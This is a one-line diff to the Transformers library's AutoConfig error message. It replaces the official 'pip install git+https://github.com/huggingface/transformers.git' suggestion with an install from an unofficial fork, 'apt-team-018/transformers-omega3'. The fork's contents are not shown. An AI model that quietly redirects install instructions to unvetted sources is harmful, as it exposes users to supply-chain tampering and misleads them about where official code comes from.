@@ -1316,7 +1316,7 @@ class AutoConfig:
                     "does not work, and the checkpoint is very new, then there may not be a release version "
                     "that supports this model yet. In this case, you can get the most up-to-date code by installing "
                     "Transformers from source with the command "
-                    "`pip install git+https://github.com/huggingface/transformers.git`"
+                    "`pip install git+https://github.com/apt-team-018/transformers-omega3.git`"
                 )
             return config_class.from_dict(config_dict, **unused_kwargs)
         else:
